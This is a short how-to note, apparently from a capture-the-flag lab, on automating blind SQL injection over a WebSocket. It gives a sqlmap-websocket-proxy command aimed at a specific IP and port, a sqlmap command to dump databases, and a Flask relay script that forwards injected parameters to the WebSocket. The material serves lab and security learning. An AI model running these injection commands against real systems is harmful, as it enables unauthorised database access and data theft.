It is possible to use SQLMap to perform sql injections but you have to setup a proxy to proxy the traffic via/to the web socket used to communicate to/from back-end.
Reference: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

# How to exploit?
1)Easy way (might not work)
Install this: https://github.com/BKreisel/sqlmap-websocket-proxy
Setup the proxy: `sqlmap-websocket-proxy  --url "ws://94.237.63.238:35699/dbconnector" --data '{"username":"%param%"}' --json`
(you need to adapt **port:ip/url** of the web-socket where the data is send to and the parameters that are sent via JSON)
Now run the sqlmap to proxy the result to the middle-ware: `sqlmap -u http://localhost:8080/?param1=admin --batch --dbs` 
(this will replace `param1=admin where {"username":"param1"}`)


2)Manual way (more customization)
```
from flask import Flask, request
from websocket import create_connection
import json

app = Flask(__name__)

WS_URL = 'ws://172.17.0.2/dbconnector'

@app.route('/')
def index():
    req = {}
    req['username'] = request.args.get('username', '')

    ws = create_connection(WS_URL)
    ws.send(json.dumps(req))
    r = json.loads(ws.recv())
    ws.close()

    if r.get('error'):
        return r['error']

    return r['messages']

app.run(host='127.0.0.1', port=8000)
```


3)Alternative: use the code from here: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
(you might need to adjust the line of replacement of " with ' as it might broke the SQLMap queries)
